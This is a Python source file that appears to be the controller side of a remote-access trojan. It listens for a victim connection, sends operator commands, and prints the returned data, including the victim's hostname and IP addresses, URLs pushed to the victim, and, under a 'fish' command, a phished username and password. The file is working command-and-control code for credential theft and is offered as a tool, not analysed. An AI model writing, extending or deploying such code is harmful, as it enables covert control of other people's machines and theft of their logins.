import time
import socket
import sys
import os
import time
import keyboard

from pynput.keyboard import Key, Listener
from threading import *

# Initialize soc to socket
soc = socket.socket()

# Initialize the host
host = socket.gethostname()

# Initialize the port
port = 8080

# Bind the socket with port and host
soc.bind(('', port))
print("Waiting for connections...")

# listening for connections
soc.listen()

conn, addr = soc.accept()
print(addr, "is connected to server")

def connection():
   # accepting the incoming connections
   conn, addr = soc.accept()
   print(addr, "is connected to server")

# take command as input
def take_command():
   x = 10
   try:
      command = input(str("Enter Command :"))
      conn.send(command.encode())
      print("Command has been sent successfully.")
   except:
      print("Client has disconnected...")
      for x in range (10, 0, -1):
         print(f"Closing in... {x}", end="")
         time.sleep(1)
         print(" \r", end="")
      
take_command()

while True:
   try:
      # receive the confirmation
      data = conn.recv(1024)
      data = data.decode()
      if data == "Command received":
         print("Command received and executed successfully.\n")
         take_command()
      elif data == "ip":
         print("Command received and executed successfully.\n\n==============================================")

         hostname = conn.recv(1024)
         hostname = hostname.decode()
         print(f"Hostname: {hostname}")

         ipv4 = conn.recv(1024)
         ipv4 = ipv4.decode()
         print(f"Ipv4: {ipv4}")

         ipv6 = conn.recv(1024)
         ipv6 = ipv6.decode()
         print(f"Ipv6: {ipv6}")

         fqdn = conn.recv(1024)
         fqdn = fqdn.decode()
         print(f"fqdn: {fqdn}\n==============================================\n")

         take_command()
      elif data == "send":
         time.sleep(1)
         
         updt = input("Input Text: ")
         conn.send(updt.encode())
         print("Command received and executed successfully.")

         print("")
         take_command()
      elif data == "fish":
         username = conn.recv(1024)
         username = username.decode()
         if username == "Client window closed...":
            print("Command received and executed successfully.\n\n==============================================")
            print(f"{username}\n==============================================\n")
         else:
            print("Command received and executed successfully.\n\n==============================================")
            print(f"Username: {username}")
         
            pss = conn.recv(1024)
            pss = pss.decode()
            print(f"Password: {pss}\n==============================================\n")

         take_command()
      elif data == "resp":
         print("Command received and executed successfully.")
               
         resp = conn.recv(1024)
         resp = resp.decode()

         print("\n\n==============================================")
         print(f"{resp}\n==============================================\n")
         
         take_command()
      elif data == "www":
         time.sleep(1)
         
         updt = input("Input URL: ")
         conn.send(updt.encode())
         print("Command received and executed successfully.")

         print("")
         
         take_command()
      else:
         print("Command received. Execution Failed\n")
         take_command()
   except:
      break

